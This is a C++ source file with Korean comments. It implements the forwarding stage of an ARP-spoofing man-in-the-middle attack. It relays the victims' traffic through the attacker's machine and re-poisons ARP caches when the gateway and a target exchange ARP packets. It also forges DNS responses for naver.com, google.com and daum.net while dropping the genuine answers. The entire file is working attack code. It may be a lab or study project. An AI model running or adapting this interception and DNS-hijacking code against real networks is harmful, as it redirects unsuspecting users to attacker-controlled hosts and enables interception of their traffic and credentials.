#include "packet_forwarder.hpp"
#include "dns_spoof.hpp"
#include <iostream>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <string.h>

using namespace std;

#define DNS_PORT 53

/* TODO
 * https요청도 DROP 해야함  
 * ARP 패킷 일 경우, Target IP 여부 확인 후, ARP 재전송 로직 필요
*/

PacketForwarder::PacketForwarder(pcap_t* handle, ArpSpoofer* spoofer)
    : handle(handle), spoofer(spoofer), running(false) {}

PacketForwarder::~PacketForwarder() {
    stop();
}

void PacketForwarder::start() 
{
    if (running)
        return;
    running = true;
    forward_thread = make_unique<thread>(&PacketForwarder::forward_loop, this);
}

void PacketForwarder::stop() 
{
    running = false;
    cv.notify_all();
    if (forward_thread && forward_thread->joinable())
        forward_thread->join();
}

void PacketForwarder::forward_loop() 
{
    cout << "패킷 포워딩 시작됨.\n";
    struct pcap_pkthdr* header;
    const u_int8_t* packet_data;
    int res;
    while (running) {
        
        res = pcap_next_ex(handle, &header, &packet_data);
        if (res == 0)
        {  // Pcap Time out 일 경우
            this_thread::sleep_for(chrono::milliseconds(1));    // 혹시 모를 busy 방지
            continue;
        } else if (res < 0) {
            cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << "\n";
            break;
        }
        struct ether_header* eth = (struct ether_header*)packet_data;
        
        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) 
        {
            struct arp_header* arp = (struct arp_header*)(packet_data + sizeof(struct ether_header));

            const u_int8_t* sender_ip = arp->spa;
            const u_int8_t* target_ip = arp->tpa;

            // gateway 또는 target IP로의 ARP 요청인지 확인
            bool involves_gateway = ip_equals(sender_ip, spoofer->get_gateway_ip()) || ip_equals(target_ip, spoofer->get_gateway_ip());
            bool involves_target = false;

            for (const auto& target : spoofer->get_targets()) 
            {
                if (ip_equals(sender_ip, target->get_ip()) || ip_equals(target_ip, target->get_ip())) 
                {
                    involves_target = true;
                    break;
                }
            }

            if (involves_gateway && involves_target) 
            {
                cout << "[ARP 요청] 게이트웨이 <-> 타겟 간 ARP 요청 감지. 스푸핑 ARP 재전송.\n";
                for (const auto& target : spoofer->get_targets()) 
                {
                    spoofer->send_arp_spoofing_packet(target.get());
                }
            }
        }

        else if (ntohs(eth->ether_type) == ETHERTYPE_IP) 
        {
            if (is_spoofed_packet(packet_data, header->len))
            {
                forward_packet(packet_data, header->len);
            }
                
        }
    }
    cout << "패킷 포워딩 중지됨.\n";
}

// 공격 대상 IP의 통신인지 확인
bool PacketForwarder::is_spoofed_packet(const u_int8_t* packet_data, size_t packet_len)
{
    if (packet_len < sizeof(struct ether_header) + sizeof(struct ip_header))
    {
        return false;
    }
    struct ether_header* eth = (struct ether_header*)packet_data;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP)
    {
        return false;
    }
    
    struct ip_header* ip = (struct ip_header*)(packet_data + sizeof(struct ether_header));
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);

    bool src_is_target = false, dst_is_target = false;
    bool src_is_gateway = ip_equals(src_ip, spoofer->get_gateway_ip());
    bool dst_is_gateway = ip_equals(dst_ip, spoofer->get_gateway_ip());
    for (const auto& target : spoofer->get_targets()) 
    {
        if (ip_equals(src_ip, target->get_ip()))
        {
            src_is_target = true;
        }
        if (ip_equals(dst_ip, target->get_ip()))
        {
            dst_is_target = true;
        }
            
    }
    return (src_is_target && dst_is_gateway) || (src_is_gateway && dst_is_target);
}
// Spoofing 중인 통신 데이터 일 경우, DNS DROP 및 다른 패킷들 forward 처리
void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_len) 
{
    u_int8_t* new_packet = new u_int8_t[packet_len];
    memcpy(new_packet, packet_data, packet_len);
    struct ether_header* eth = (struct ether_header*)new_packet;
    struct ip_header* ip = (struct ip_header*)(new_packet + sizeof(struct ether_header));
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);

    // MAC 주소 설정
    if (ip_equals(src_ip, spoofer->get_gateway_ip())) 
    {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        bool found = false;
        for (const auto& target : spoofer->get_targets()) 
        {
            if (ip_equals(dst_ip, target->get_ip())) 
            {
                memcpy(eth->ether_dhost, target->get_mac(), 6);
                found = true;
                break;
            }
        }
        if (!found) 
        {
            delete[] new_packet;
            return;
        }
    } 
    else 
    {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        memcpy(eth->ether_dhost, spoofer->get_gateway_mac(), 6);
    }

    // DNS 포트 검사
    if (ip->ip_p == IPPROTO_UDP) 
    {
        int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
        if (packet_len >= sizeof(struct ether_header) + ip_header_len + sizeof(udp_header)) 
        {
            udp_header* udp = (udp_header*)(new_packet + sizeof(struct ether_header) + ip_header_len);
            u_int16_t sport = ntohs(udp->uh_sport);
            u_int16_t dport = ntohs(udp->uh_dport);

            // DNS 요청 (클라이언트 -> 서버)
            if (dport == DNS_PORT && !ip_equals(src_ip, spoofer->get_gateway_ip())) 
            {
                uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                string domain = extract_domain_name(dns_ptr, dns_len);

                for (size_t i = 0; i < domain.size(); ++i) domain[i] = tolower(domain[i]);
                if (!domain.empty() && domain.back() == '.') domain.pop_back();

                bool should_spoof = (domain.find("naver.com") != string::npos || 
                                     domain.find("google.com") != string::npos || 
                                     domain.find("daum.net") != string::npos);

                uint8_t* qptr = dns_ptr + 12;
                while (*qptr != 0 && qptr < dns_ptr + dns_len) qptr += (*qptr) + 1;
                qptr++;
                uint16_t qtype = ntohs(*(uint16_t*)qptr);

                if (should_spoof && (qtype == 1 || qtype == 65)) // A 또는 HTTPS 레코드 요청
                {
                    send_dns_spoof_response(handle, new_packet, packet_len,
                        spoofer->get_attacker_mac(), spoofer->get_gateway_ip(),
                        domain, spoofer->get_targets());

                    cout << "DNS 요청 패킷 (" << domain << ") DROP.\n";
                    delete[] new_packet;
                    return;
                }
            }

            // DNS 응답 (서버 -> 클라이언트)
            else if (sport == DNS_PORT && ip_equals(src_ip, spoofer->get_gateway_ip())) 
            {
                uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));

                if (dns_len >= sizeof(dns_header)) 
                {
                    dns_header* dns_hdr = (dns_header*)dns_ptr;
                    if ((ntohs(dns_hdr->flags) & 0x8000)) 
                    {
                        string domain = extract_domain_name(dns_ptr, dns_len);
                        for (size_t i = 0; i < domain.size(); ++i) domain[i] = tolower(domain[i]);
                        if (!domain.empty() && domain.back() == '.') domain.pop_back();

                        if (domain.find("naver.com") != string::npos ||
                            domain.find("google.com") != string::npos ||
                            domain.find("daum.net") != string::npos) 
                        {
                            cout << "게이트웨이 DNS 응답 (" << domain << ") DROP." << endl;
                            delete[] new_packet;
                            return;
                        }
                    }
                }
            }
        }
    }

    // 일반 포워딩
    if (mac_equals(eth->ether_dhost, ZERO_MAC)) 
    {
        cout << "목적지 MAC 주소가 설정되지 않았습니다. 패킷을 전달하지 않습니다." << endl;
    } 
    else 
    {
        if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
            cerr << "패킷 포워딩 실패: " << pcap_geterr(handle) << "\n";
    }

    delete[] new_packet;
}

